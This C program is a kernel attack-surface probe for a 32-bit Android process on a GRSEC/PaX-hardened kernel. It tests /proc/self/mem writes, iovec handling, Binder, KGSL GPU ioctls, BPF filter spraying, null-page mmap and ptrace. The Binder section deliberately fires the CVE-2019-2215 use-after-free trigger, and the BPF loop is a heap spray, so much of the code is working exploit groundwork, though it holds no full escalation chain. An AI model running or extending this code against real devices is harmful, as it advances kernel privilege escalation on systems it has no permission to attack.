#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <stdint.h>
#include <signal.h>
#include <pthread.h>

/*
 * 32-bit Compat Syscall Probe
 *
 * Tests whether compat (32-bit) syscall paths have different
 * GRSEC hardening than 64-bit paths. Key areas:
 *
 * 1. /proc/self/mem write — maybe different checks in compat?
 * 2. compat_writev / compat_readv — different iovec handling
 * 3. Binder from 32-bit process — different struct layouts
 * 4. KGSL from 32-bit — different ioctl struct sizes
 * 5. Slab behavior — does GRSEC slab isolation differ for compat?
 */

/* Binder defines */
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_VERSION          _IOWR('b', 9, struct binder_version)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int32_t)
#define BC_FREE_BUFFER          6  /* (void *) ptr */
#define BC_ENTER_LOOPER         13

struct binder_write_read {
    /* Note: 32-bit!! pointers and sizes are 32-bit */
    int32_t write_size;
    int32_t write_consumed;
    uint32_t write_buffer;  /* 32-bit pointer */
    int32_t read_size;
    int32_t read_consumed;
    uint32_t read_buffer;   /* 32-bit pointer */
};

struct binder_version {
    int32_t protocol_version;
};

int main(void) {
    printf("=== 32-bit Compat Syscall Probe ===\n");
    printf("uid=%d pid=%d sizeof(void*)=%zu sizeof(long)=%zu\n\n",
           getuid(), getpid(), sizeof(void *), sizeof(long));
    signal(SIGPIPE, SIG_IGN);

    /* === 1. /proc/self/mem write test === */
    printf("--- /proc/self/mem write (compat path) ---\n");
    {
        int f = open("/proc/self/mem", O_RDWR);
        if (f >= 0) {
            printf("  O_RDWR: OK (fd=%d)\n", f);

            /* Try writing to a stack variable */
            volatile uint32_t target = 0xAAAAAAAA;
            off_t addr = (off_t)(uintptr_t)&target;
            lseek(f, addr, SEEK_SET);
            uint32_t newval = 0xBBBBBBBB;
            ssize_t w = write(f, &newval, 4);
            printf("  Write to stack: w=%zd errno=%d target=0x%08x %s\n",
                   w, w < 0 ? errno : 0, target,
                   target == 0xBBBBBBBB ? "WORKS(!)" : "BLOCKED");

            /* Try via writev (compat_writev path) */
            target = 0xCCCCCCCC;
            struct iovec iov = { .iov_base = &newval, .iov_len = 4 };
            lseek(f, (off_t)(uintptr_t)&target, SEEK_SET);
            ssize_t wv = writev(f, &iov, 1);
            printf("  writev to stack: wv=%zd errno=%d target=0x%08x %s\n",
                   wv, wv < 0 ? errno : 0, target,
                   target == 0xBBBBBBBB ? "WORKS(!)" : "BLOCKED");

            /* Try to mmap region and write */
            void *rw = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (rw != MAP_FAILED) {
                *(uint32_t *)rw = 0xDDDDDDDD;
                lseek(f, (off_t)(uintptr_t)rw, SEEK_SET);
                newval = 0xEEEEEEEE;
                w = write(f, &newval, 4);
                printf("  Write to anon mmap: w=%zd errno=%d val=0x%08x %s\n",
                       w, w < 0 ? errno : 0, *(volatile uint32_t *)rw,
                       *(volatile uint32_t *)rw == 0xEEEEEEEE ? "WORKS(!)" : "BLOCKED");
                munmap(rw, 4096);
            }

            close(f);
        } else {
            printf("  O_RDWR: FAIL (errno=%d %s)\n", errno, strerror(errno));
        }
    }

    /* === 2. Compat iovec handling === */
    printf("\n--- Compat iovec handling ---\n");
    {
        int pfd[2];
        if (pipe(pfd) == 0) {
            /* writev with many iovecs */
            char bufs[16][256];
            struct iovec iovs[16];
            for (int i = 0; i < 16; i++) {
                memset(bufs[i], 'A' + i, 256);
                iovs[i].iov_base = bufs[i];
                iovs[i].iov_len = 256;
            }
            ssize_t wv = writev(pfd[1], iovs, 16);
            printf("  writev(16 iovecs × 256): %zd\n", wv);

            /* readv back with different iovec layout */
            char rbuf[4096] = {0};
            struct iovec riov = { .iov_base = rbuf, .iov_len = 4096 };
            ssize_t rv = readv(pfd[0], &riov, 1);
            printf("  readv: %zd\n", rv);

            /* writev with zero-length iovec in middle */
            struct iovec mixed[3] = {
                { .iov_base = bufs[0], .iov_len = 100 },
                { .iov_base = NULL, .iov_len = 0 },
                { .iov_base = bufs[1], .iov_len = 100 },
            };
            wv = writev(pfd[1], mixed, 3);
            printf("  writev(zero-len middle): %zd (errno=%d)\n",
                   wv, wv < 0 ? errno : 0);

            /* writev with very large count */
            struct iovec big[1024];
            for (int i = 0; i < 1024; i++) {
                big[i].iov_base = bufs[0];
                big[i].iov_len = 1;
            }
            wv = writev(pfd[1], big, 1024);
            printf("  writev(1024 × 1byte): %zd (errno=%d)\n",
                   wv, wv < 0 ? errno : 0);

            close(pfd[0]);
            close(pfd[1]);
        }
    }

    /* === 3. Binder from 32-bit process === */
    printf("\n--- Binder (32-bit structs) ---\n");
    {
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfd >= 0) {
            printf("  /dev/binder: fd=%d\n", bfd);

            /* Get binder version */
            struct binder_version ver = {0};
            int ret = ioctl(bfd, BINDER_VERSION, &ver);
            printf("  BINDER_VERSION: ret=%d ver=%d\n", ret, ver.protocol_version);

            /* Set max threads */
            uint32_t max = 0;
            ret = ioctl(bfd, BINDER_SET_MAX_THREADS, &max);
            printf("  SET_MAX_THREADS(0): ret=%d\n", ret);

            /* mmap the binder buffer — 32-bit address space! */
            void *bmap = mmap(NULL, 4096, PROT_READ,
                             MAP_PRIVATE, bfd, 0);
            printf("  mmap: %s (%p)\n",
                   bmap != MAP_FAILED ? "OK" : "FAIL", bmap);

            /* Test epoll + binder (CVE-2019-2215 trigger path) */
            int epfd = epoll_create(1);
            if (epfd >= 0) {
                struct epoll_event ev = {
                    .events = EPOLLIN,
                    .data = { .fd = bfd }
                };
                ret = epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
                printf("  epoll_ctl(ADD binder): %s\n",
                       ret == 0 ? "OK" : "FAIL");

                if (ret == 0) {
                    /* Enter looper */
                    uint32_t cmd = BC_ENTER_LOOPER;
                    struct binder_write_read bwr = {0};
                    bwr.write_size = sizeof(cmd);
                    bwr.write_buffer = (uint32_t)(uintptr_t)&cmd;
                    ioctl(bfd, BINDER_WRITE_READ, &bwr);

                    /* Thread exit — triggers UAF */
                    int32_t dummy = 0;
                    ret = ioctl(bfd, BINDER_THREAD_EXIT, &dummy);
                    printf("  BINDER_THREAD_EXIT: ret=%d errno=%d\n",
                           ret, ret < 0 ? errno : 0);

                    /* Try epoll_ctl remove (touches freed memory) */
                    ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, NULL);
                    printf("  epoll_ctl(DEL after exit): ret=%d errno=%d\n",
                           ret, ret < 0 ? errno : 0);
                }

                close(epfd);
            }

            if (bmap != MAP_FAILED) munmap(bmap, 4096);
            close(bfd);
        }
    }

    /* === 4. KGSL from 32-bit === */
    printf("\n--- KGSL (32-bit structs) ---\n");
    {
        /* On 32-bit ARM, ioctl struct sizes are different because
         * sizeof(unsigned long) = 4 instead of 8.
         * This means GPUMEM_ALLOC struct is 16 bytes not 24.
         */
        int kfd = open("/dev/kgsl-3d0", O_RDWR);
        if (kfd >= 0) {
            printf("  /dev/kgsl-3d0: fd=%d\n", kfd);

            /* 32-bit GPUMEM_ALLOC struct */
            struct {
                uint32_t gpuaddr;  /* 4 bytes (was 8 on 64-bit) */
                uint32_t size;     /* 4 bytes (was 8 on 64-bit) */
                uint32_t flags;    /* 4 */
                uint32_t __pad;    /* 4 */
            } alloc32 = {0};
            alloc32.size = 4096;
            alloc32.flags = (3 << 16); /* WRITEBACK */

            /* Encode ioctl with 32-bit struct size (16 bytes) */
            unsigned long cmd32 = (3UL << 30) | (16UL << 16) | (0x09 << 8) | 0x2f;
            int ret = ioctl(kfd, cmd32, &alloc32);
            printf("  GPUMEM_ALLOC(16 byte struct): ret=%d errno=%d gpuaddr=0x%x\n",
                   ret, ret < 0 ? errno : 0, alloc32.gpuaddr);

            if (ret == 0 && alloc32.gpuaddr) {
                /* mmap with 32-bit offset */
                void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                               MAP_SHARED, kfd, alloc32.gpuaddr);
                printf("  mmap: %s (%p)\n",
                       p != MAP_FAILED ? "OK" : "FAIL", p);
                if (p != MAP_FAILED) {
                    *(uint32_t *)p = 0x12345678;
                    printf("  write: 0x%08x\n", *(volatile uint32_t *)p);
                    munmap(p, 4096);
                }
            }

            close(kfd);
        }
    }

    /* === 5. Socket BPF from 32-bit === */
    printf("\n--- Socket BPF (32-bit) ---\n");
    {
        struct sock_filter {
            uint16_t code;
            uint8_t jt, jf;
            uint32_t k;
        };
        struct sock_fprog {
            uint16_t len;
            uint16_t __pad;     /* alignment on 32-bit */
            uint32_t filter;    /* 32-bit pointer */
        };

        /* Classic BPF: RET ALLOW */
        struct sock_filter insns[1] = {{ 0x06, 0, 0, 0xFFFF }};

        /* Use the standard struct for setsockopt */
        struct {
            uint16_t len;
            void *filter;
        } prog;
        prog.len = 1;
        prog.filter = insns;

        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s >= 0) {
            int ret = setsockopt(s, SOL_SOCKET, 26 /* SO_ATTACH_FILTER */,
                                &prog, sizeof(prog));
            printf("  SO_ATTACH_FILTER: %s (errno=%d)\n",
                   ret == 0 ? "OK" : "FAIL", ret < 0 ? errno : 0);
            close(s);
        }

        /* Spray test */
        int bpf_socks[100];
        int bpf_cnt = 0;
        struct sock_filter insns64[64];
        for (int i = 0; i < 64; i++) {
            insns64[i].code = 0x06;
            insns64[i].jt = 0;
            insns64[i].jf = 0;
            insns64[i].k = 0xFFFF;
        }
        struct { uint16_t len; void *filter; } prog64;
        prog64.len = 64;
        prog64.filter = insns64;

        for (int i = 0; i < 100; i++) {
            bpf_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (bpf_socks[i] < 0) break;
            if (setsockopt(bpf_socks[i], SOL_SOCKET, 26,
                          &prog64, sizeof(prog64)) == 0)
                bpf_cnt++;
        }
        printf("  BPF spray: %d filters attached\n", bpf_cnt);
        for (int i = 0; i < 100; i++)
            if (bpf_socks[i] >= 0) close(bpf_socks[i]);
    }

    /* === 6. Check PaX flags for 32-bit process === */
    printf("\n--- PaX flags (32-bit process) ---\n");
    {
        FILE *f = fopen("/proc/self/status", "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, "PaX") || strstr(line, "CapBnd") ||
                    strstr(line, "CapEff") || strstr(line, "Seccomp") ||
                    strstr(line, "NoNewPrivs"))
                    printf("  %s", line);
            }
            fclose(f);
        }
    }

    /* === 7. Additional compat-specific tests === */
    printf("\n--- Compat-specific ---\n");
    {
        /* Check address space layout */
        printf("  Stack variable addr:  %p\n", (void *)&main);
        printf("  Heap addr:            %p\n", malloc(1));
        printf("  mmap addr:            %p\n",
               mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));

        /* Can we mmap at low addresses? */
        void *low = mmap((void *)0x10000, 4096, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
        printf("  mmap(0x10000 FIXED): %s (%p)\n",
               low != MAP_FAILED ? "OK" : "FAIL",
               low != MAP_FAILED ? low : (void *)(long)errno);
        if (low != MAP_FAILED) munmap(low, 4096);

        /* mmap at 0x0 (null page) */
        low = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
        printf("  mmap(NULL FIXED): %s (errno=%d)\n",
               low != MAP_FAILED ? "OK(!)" : "FAIL",
               low == MAP_FAILED ? errno : 0);
        if (low != MAP_FAILED) munmap(low, 4096);

        /* ptrace self */
        printf("  ptrace: %s\n",
               syscall(101 /* __NR_ptrace (ARM) */, 0, 0, 0, 0) < 0 ?
               strerror(errno) : "OK(!)");
    }

    printf("\n=== Done ===\n");
    return 0;
}
